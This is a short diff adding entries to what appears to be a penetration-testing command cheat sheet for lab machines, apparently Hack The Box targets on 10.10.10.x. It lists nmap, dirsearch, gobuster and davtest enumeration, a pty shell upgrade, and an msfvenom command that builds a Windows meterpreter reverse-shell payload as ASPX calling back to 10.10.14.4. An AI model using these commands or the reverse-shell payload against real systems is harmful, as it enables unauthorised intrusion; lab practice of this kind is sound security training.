@@ -38,3 +38,15 @@ nmap -sC -sV -oA nmap 10.10.10.7
 python -c 'import pty;pty.spawn("/bin/bash");'
 
 python3 dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php -f -t 20 -u http://10.10.10.7/admin/
+
+iptables -L #List all the rules
+
+iptables -A OUTPUT -d 10.10.10.14 -j DROP #Drop packets going to 10.10.10.14
+
+./gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.15 -t 20
+
+davtest -url http://10.10.10.15 #For testing webDAV servers
+
+msfvenom -l | grep windows #search for windows keyword  in payloads
+
+msfvenom -p winodws/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f aspx
